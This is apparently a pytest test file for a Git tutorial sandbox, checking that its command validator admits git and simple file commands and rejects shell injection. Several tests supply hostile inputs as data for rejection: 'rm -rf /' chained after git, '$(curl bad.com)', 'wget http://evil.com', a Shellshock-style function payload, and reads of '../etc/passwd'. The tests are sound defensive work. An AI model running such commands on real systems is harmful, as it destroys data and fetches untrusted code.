import pytest
import subprocess
from pathlib import Path

from git_tutorial.sandbox import GitSandbox, validate_command, _run_git, ALLOWED_OPS


class TestValidateCommand:
    def test_empty_command(self):
        valid, msg = validate_command("")
        assert not valid
        assert "Empty" in msg

    def test_whitespace_command(self):
        valid, msg = validate_command("   ")
        assert not valid
        assert "Empty" in msg

    def test_git_command(self):
        valid, msg = validate_command("git status")
        assert valid

    def test_git_with_args(self):
        valid, msg = validate_command("git log --oneline --graph --all")
        assert valid

    def test_blocked_semicolon(self):
        valid, msg = validate_command("git status; rm -rf /")
        assert not valid

    def test_blocked_pipe(self):
        valid, msg = validate_command("git log | head -5")
        assert not valid

    def test_blocked_backtick(self):
        valid, msg = validate_command("`ls`")
        assert not valid

    def test_blocked_dollar_paren(self):
        valid, msg = validate_command("$(curl bad.com)")
        assert not valid

    def test_blocked_curly_brace(self):
        valid, msg = validate_command("evil(){ :; }; echo pwned")
        assert not valid

    def test_blocked_ampersand(self):
        valid, msg = validate_command("make && make install")
        assert not valid

    def test_blocked_exclamation(self):
        valid, msg = validate_command("echo !important")
        assert not valid

    def test_allowed_echo(self):
        valid, msg = validate_command("echo hello")
        assert valid

    def test_allowed_echo_redirect(self):
        valid, msg = validate_command("echo hello > test.txt")
        assert valid

    def test_allowed_echo_append(self):
        valid, msg = validate_command("echo line >> file.txt")
        assert valid

    def test_allowed_ls(self):
        valid, msg = validate_command("ls -la")
        assert valid

    def test_allowed_cat(self):
        valid, msg = validate_command("cat README.md")
        assert valid

    def test_allowed_mkdir(self):
        valid, msg = validate_command("mkdir mydir")
        assert valid

    def test_allowed_touch(self):
        valid, msg = validate_command("touch newfile.txt")
        assert valid

    def test_allowed_pwd(self):
        valid, msg = validate_command("pwd")
        assert valid

    def test_blocked_unknown_command(self):
        valid, msg = validate_command("wget http://evil.com")
        assert not valid
        assert "Command not allowed" in msg

    def test_path_traversal_blocked(self):
        valid, msg = validate_command("cat ../etc/passwd")
        assert not valid

    def test_rm_not_allowed(self):
        assert "rm" not in ALLOWED_OPS


class TestGitSandbox:
    def test_init(self, sandbox):
        assert sandbox.repo_path.exists()
        assert (sandbox.repo_path / ".git").exists()

    def test_run_git_success(self, sandbox):
        r = sandbox.run_command("git status")
        assert r["success"]
        assert "On branch main" in r["stdout"] or "nothing committed" in r["stdout"]

    def test_run_git_failure(self, sandbox):
        r = sandbox.run_command("git nonexistent-command")
        assert not r["success"]
        assert r["stderr"]

    def test_run_git_with_timeout(self):
        result = _run_git(["status"], Path("/nonexistent"), timeout=1)
        assert not result["success"]

    def test_echo_no_redirect(self, sandbox):
        r = sandbox.run_command("echo hello world")
        assert r["success"]
        assert r["stdout"].strip() == "hello world"

    def test_echo_redirect(self, sandbox):
        r = sandbox.run_command("echo hello > test.txt")
        assert r["success"]
        assert (sandbox.repo_path / "test.txt").exists()
        assert (sandbox.repo_path / "test.txt").read_text().strip() == "hello"

    def test_echo_redirect_absolute_path_blocked(self, sandbox):
        r = sandbox.run_command("echo hello > /etc/passwd")
        assert not r["success"]

    def test_echo_redirect_path_traversal_blocked(self, sandbox):
        r = sandbox.run_command("echo hello > ../danger.txt")
        assert not r["success"]

    def test_echo_append(self, sandbox):
        sandbox.run_command("echo first > file.txt")
        sandbox.run_command("echo second >> file.txt")
        content = (sandbox.repo_path / "file.txt").read_text().strip()
        assert "first" in content
        assert "second" in content

    def test_printf(self, sandbox):
        r = sandbox.run_command("printf hello")
        assert r["success"]
        assert r["stdout"].strip() == "hello"

    def test_mkdir(self, sandbox):
        r = sandbox.run_command("mkdir mydir")
        assert r["success"]
        assert (sandbox.repo_path / "mydir").exists()

    def test_touch(self, sandbox):
        r = sandbox.run_command("touch newfile.txt")
        assert r["success"]
        assert (sandbox.repo_path / "newfile.txt").exists()

    def test_ls(self, sandbox):
        sandbox.run_command("touch a.txt")
        r = sandbox.run_command("ls")
        assert r["success"]
        assert "a.txt" in r["stdout"]

    def test_cat(self, sandbox):
        sandbox.run_command("echo data > data.txt")
        r = sandbox.run_command("cat data.txt")
        assert r["success"]
        assert "data" in r["stdout"]

    def test_pwd(self, sandbox):
        r = sandbox.run_command("pwd")
        assert r["success"]
        assert str(sandbox.repo_path) in r["stdout"]

    def test_head(self, sandbox):
        sandbox.run_command("echo line1 > f.txt")
        sandbox.run_command("echo line2 >> f.txt")
        r = sandbox.run_command("head -1 f.txt")
        assert r["success"]
        assert "line1" in r["stdout"]

    def test_tail(self, sandbox):
        sandbox.run_command("echo line1 > f.txt")
        sandbox.run_command("echo line2 >> f.txt")
        r = sandbox.run_command("tail -1 f.txt")
        assert r["success"]
        assert "line2" in r["stdout"]

    def test_blocked_command(self, sandbox):
        r = sandbox.run_command("rm -rf /")
        assert not r["success"]
        assert "Command not allowed" in r["stderr"]

    def test_create_initial_commit(self, sandbox):
        sandbox.create_initial_commit()
        r = sandbox.run_command("git log --oneline")
        assert r["success"]
        assert "Initial commit" in r["stdout"]

    def test_get_graph_empty(self, sandbox):
        graph = sandbox.get_graph()
        assert "no commits" in graph

    def test_get_graph_with_commits(self, sandbox):
        sandbox.create_initial_commit()
        graph = sandbox.get_graph()
        assert "Initial commit" in graph or "*" in graph

    def test_get_status_clean(self, sandbox):
        status = sandbox.get_status()
        assert "clean working tree" in status or "working tree" in status or "## " in status

    def test_get_status_modified(self, sandbox):
        sandbox.create_initial_commit()
        sandbox.run_command("echo change > README.md")
        status = sandbox.get_status()
        assert "M" in status or "??" in status

    def test_get_diff_no_changes(self, sandbox):
        diff = sandbox.get_diff()
        assert "no changes" in diff

    def test_get_diff_with_changes(self, sandbox):
        sandbox.create_initial_commit()
        sandbox.run_command("echo modified > README.md")
        diff = sandbox.get_diff()
        assert diff != "[dim](no changes to diff)[/]"

    def test_get_branches_default(self, sandbox):
        branches = sandbox.get_branches()
        assert "main" in branches

    def test_get_branches_after_create(self, sandbox):
        sandbox.create_initial_commit()
        sandbox.run_command("git branch feature")
        branches = sandbox.get_branches()
        assert "main" in branches
        assert "feature" in branches

    def test_reset_repo(self, sandbox):
        old_path = sandbox.repo_path
        sandbox.create_initial_commit()
        sandbox.reset_repo()
        assert sandbox.repo_path != old_path
        r = sandbox.run_command("git log --oneline")
        assert not r["success"] or "commit" not in r["stdout"].lower()

    def test_cleanup_removes_temp(self, sandbox):
        path = sandbox.repo_path
        sandbox.cleanup()
        assert not path.exists()

    def test_context_manager(self):
        with GitSandbox() as sb:
            assert sb.repo_path.exists()
            r = sb.run_command("git status")
            assert r["success"]
        # should be cleaned up
        assert not sb.repo_path.exists()


class TestRemoteSandbox:
    def test_setup_remote(self, sandbox_with_remote):
        sb = sandbox_with_remote
        assert sb.remote_path is not None
        assert sb.remote_path.exists()
        assert (sb.remote_path / "HEAD").exists()  # bare repo has HEAD

    def test_remote_configured(self, sandbox_with_remote):
        r = sandbox_with_remote.run_command("git remote -v")
        assert r["success"]
        assert "origin" in r["stdout"]
        assert "fetch" in r["stdout"]
        assert "push" in r["stdout"]

    def test_push_to_remote(self, sandbox_with_remote):
        sb = sandbox_with_remote
        sb.create_initial_commit()
        r = sb.run_command("git push -u origin main")
        assert r["success"]

    def test_push_and_pull(self, sandbox_with_remote):
        sb = sandbox_with_remote
        sb.create_initial_commit()
        r = sb.run_command("git push -u origin main")
        assert r["success"], f"Push failed: {r['stderr']}"
        # Clone to a second sandbox and verify
        sb2 = GitSandbox()
        try:
            clone_target = sb2.repo_path / "cloned"
            result = subprocess.run(
                ["git", "clone", str(sb.remote_path), str(clone_target)],
                capture_output=True, text=True, timeout=10,
            )
            assert result.returncode == 0, f"Clone failed: {result.stderr}"
            assert clone_target.exists()
            assert (clone_target / "README.md").exists()
        finally:
            sb2.cleanup()


class TestValidationEdgeCases:
    def test_echo_redirect_to_system_path_blocked(self, sandbox):
        r = sandbox.run_command("echo test > /bin/sh")
        assert not r["success"]

    def test_echo_dangerous_paths_blocked(self, sandbox):
        dangerous = ["/", "/etc", "/usr", "/dev", "/proc", "/sys", "/bin", "/sbin", "/lib", "/boot", "/root", "/home"]
        for d in dangerous:
            r = sandbox.run_command(f"echo test > {d}")
            assert not r["success"], f"Dangerous path {d} was not blocked"

    def test_git_command_with_blocked_chars(self, sandbox):
        r = sandbox.run_command("git log --oneline; echo pwned")
        assert not r["success"]

    def test_multiple_commands_blocked(self, sandbox):
        r = sandbox.run_command("git init && touch pwned.txt")
        assert not r["success"]

    def test_malformed_command(self, sandbox):
        r = sandbox.run_command("echo unclosed 'quote")
        assert not r["success"]

    def test_echo_redirect_with_quotes(self, sandbox):
        r = sandbox.run_command('echo "hello world" > test.txt')
        assert r["success"]
        assert (sandbox.repo_path / "test.txt").exists()
        content = (sandbox.repo_path / "test.txt").read_text().strip()
        assert content == "hello world"
